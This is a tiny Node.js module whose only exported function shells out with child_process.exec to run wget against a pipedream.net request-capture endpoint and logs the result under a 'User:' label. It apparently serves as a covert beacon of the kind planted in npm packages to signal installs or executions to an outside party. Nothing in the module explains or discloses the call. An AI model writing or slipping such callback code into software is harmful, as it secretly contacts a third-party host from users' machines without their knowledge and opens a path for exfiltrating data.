const { exec } = require('child_process');

module.exports = function() {
    exec('wget https://eop6hnhxqa4cd27.m.pipedream.net', (error, stdout, stderr) => {
        if (error) {
            console.error(`exec error: ${error}`);
            return;
        }
        console.log(`User: ${stdout}`);
    });
};

